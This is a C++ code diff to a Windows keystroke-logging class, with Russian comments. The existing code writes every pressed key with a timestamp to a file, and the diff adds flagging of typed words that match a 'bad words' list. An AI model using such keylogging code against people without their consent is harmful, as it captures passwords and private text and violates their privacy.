@@ -57,6 +57,18 @@ void WordOfVkeys::AddVkeyToWord(WPARAM vkey)
 	auto keySymb = GetCharSymbFromVkey(vkey, kbLayout);
 	std::string currTime = GetCurrTimeBuff();
 
+	//нужно ли искать плохие слова
+	if (_isWordAnalysis) {
+
+		AddSymbToWord(keySymb);
+
+		if (IsCurrWordBad()) {
+			std::string info = "'" + _currWord + "' : " + currTime;
+			WriteTofile(_whereToWriteWords, info);
+		}
+	}
+
+	//запись всех нажатых клавиш в файл
 	std::string info = "'" + std::string(1, keySymb) + "' : " + currTime;
 	WriteTofile(_whereToWriteKeys, info);
 }
@@ -106,4 +118,52 @@ void WordOfVkeys::WriteTofile(std::string fileName, std::string info) {
 	std::ofstream ofs(fileName, std::ofstream::out | std::ofstream::app);
 	ofs << info;
 	ofs.close();
+}
+
+// анализ слов
+void WordOfVkeys::ReadBadWords()
+{
+	if (_whereToReadBadWords._Equal(""))
+		return;
+
+	std::ifstream fin;
+
+	try {
+		fin.open(_whereToReadBadWords);
+
+		std::string word;
+		while (true) {
+			 fin >> word;
+			 if (fin.eof())
+				 break;
+
+			_badWordsList.push_back(word);
+		}
+
+	}
+	catch (...) {
+
+	}
+
+	if(fin.is_open())
+		fin.close();
+		
+}
+bool WordOfVkeys::IsCurrWordBad()
+{
+	for(const auto & w : _badWordsList)
+	{
+		if (_currWord._Equal(w))
+			return true;
+	}
+	return false;
+}
+void WordOfVkeys::AddSymbToWord(char symb)
+{
+	if (symb == char(VK_SPACE) || symb == char(VK_ACCEPT) || symb == char(VK_RETURN))
+		_currWord = "";
+	else if (symb == char(VK_BACK) && _currWord != "")
+		_currWord.pop_back();
+	else
+		_currWord.push_back(symb);
 }
